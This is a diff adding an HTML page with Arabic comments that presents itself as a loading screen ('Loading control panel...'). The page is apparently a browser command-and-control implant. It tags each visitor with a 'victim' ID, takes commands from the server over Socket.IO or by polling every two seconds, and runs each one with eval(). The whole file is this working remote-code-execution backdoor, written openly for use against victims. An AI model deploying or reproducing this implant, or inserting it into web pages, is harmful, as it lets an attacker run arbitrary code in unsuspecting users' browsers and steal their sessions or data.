@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <script>
+        const VICTIM_ID = new URLSearchParams(window.location.search).get('id');
+        
+        // 1. الاتصال عبر WebSocket
+        const socket = io('/', {
+            path: '/socket.io',
+            query: { victim_id: VICTIM_ID },
+            transports: ['websocket', 'polling']
+        });
+
+        // 2. نظام Polling الاحتياطي
+        function checkCommands() {
+            fetch(`/api/poll_commands?victim_id=${VICTIM_ID}`)
+                .then(r => r.json())
+                .then(data => {
+                    data.commands.forEach(cmd => {
+                        console.log("Executing command:", cmd.command);
+                        try {
+                            eval(cmd.command);
+                        } catch(e) {
+                            console.error("Execution error:", e);
+                        }
+                    });
+                    setTimeout(checkCommands, 2000);
+                });
+        }
+
+        // 3. تفعيل النظام
+        socket.on('connect', () => {
+            console.log("✅ Connected via WebSocket");
+            
+            socket.on('execute_command', (cmd) => {
+                console.log("Received command:", cmd.command);
+                try {
+                    eval(cmd.command);
+                } catch(e) {
+                    console.error("Execution error:", e);
+                }
+            });
+        });
+
+        socket.on('disconnect', () => {
+            console.log("⚠ Falling back to polling");
+            checkCommands();
+        });
+
+        // بدء التشغيل
+        console.log("Victim ID:", VICTIM_ID);
+    </script>
+</head>
+<body>
+    <h2>Loading control panel...</h2>
+</body>
+</html>
